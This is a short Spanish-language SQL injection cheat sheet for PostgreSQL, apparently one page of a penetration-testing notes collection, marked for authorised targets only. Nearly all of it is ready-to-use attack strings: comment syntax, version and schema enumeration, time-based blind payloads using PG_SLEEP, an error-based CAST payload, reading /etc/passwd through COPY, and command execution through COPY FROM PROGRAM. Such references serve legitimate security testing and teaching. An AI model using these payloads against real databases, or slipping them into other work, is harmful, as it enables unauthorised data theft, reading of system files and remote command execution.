# SQLi — PostgreSQL

Ver índice: [sqli.md](sqli.md). **Solo sobre objetivos autorizados.**

## Comentarios

```
-- -      /* */
```

## Info básica

```sql
SELECT version();
SELECT current_database();
SELECT current_user;
```

## Concatenación

```sql
'a' || 'b'        CONCAT(a,b)        STRING_AGG(col, ',')
```

## Enumeración del esquema

```sql
SELECT datname FROM pg_database;
SELECT table_name FROM information_schema.tables;
SELECT column_name FROM information_schema.columns WHERE table_name='users';
```

## Blind — time-based

```sql
' AND (SELECT 1 FROM PG_SLEEP(5))-- -
'; SELECT CASE WHEN (SUBSTRING(current_database(),1,1)='a') THEN PG_SLEEP(5) ELSE PG_SLEEP(0) END-- -
```

## Error-based

```sql
' AND 1=CAST((SELECT version()) AS int)-- -
```

## Stacked queries y RCE (según versión/privilegios)

```sql
-- lectura de fichero
CREATE TABLE t(x text); COPY t FROM '/etc/passwd';
-- RCE vía COPY ... FROM PROGRAM (PostgreSQL >= 9.3, superuser)
COPY t FROM PROGRAM 'id';
```

## Notas

- Cadenas con `chr()` para evitar comillas.
- `COPY ... FROM PROGRAM` es la vía típica a RCE si eres superuser.
